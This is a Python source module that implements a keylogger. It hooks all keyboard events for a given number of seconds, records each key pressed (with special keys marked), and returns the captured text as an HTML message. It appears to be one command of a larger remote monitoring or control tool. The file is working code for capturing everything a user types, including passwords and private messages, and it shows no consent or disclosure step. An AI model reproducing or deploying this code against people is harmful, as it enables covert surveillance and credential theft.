import datetime
import keyboard
from keyboard import KeyboardEvent
import time

from .html_generator import html_msg

spec_key = {
    key: f'⌠{key}⌡'
    for key in [
        'ctrl', 'shift', 'tab',
        'esc', 'left windows', 'print screen',
        'end', 'delete', 'f1', 'f2', 'f3', 'f4', 
        'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
        'insert', 'down', 'page down',
        'right', 'clear', 'left',
        'home', 'up', 'num lock',
        'backspace', 'enter', 'right shift',
        'page up', 'space', 'alt',
        'caps lock', 'right alt', 'right ctrl',
    ]
}

spec_key['space'] = ' '

def __parse_key_event(event: KeyboardEvent):
    if event.event_type == keyboard.KEY_UP:
        return ""
    
    res = str(event.name)
    
    global spec_key    
    
    if res in spec_key:
        res = spec_key[res]
    
    return res

def __key_log(duration):
    logger = []
    
    _time = datetime.datetime.now()
    
    keyboard.hook(
        lambda event: logger.append(__parse_key_event(event))
    )
    
    time.sleep(duration)
    keyboard.unhook_all()

    content = f'{duration} seconds of key logging (from: {_time}): <span style="font-weight: bold;">' + ''.join(logger) + '</span>'
    
    return content

def get_key_log(duration = 5):
    duration = int(duration)
    
    content = __key_log(duration)
    
    response = {
        'html': html_msg(content, status=None, bold_all=False),
        'data': None
    }
    
    return response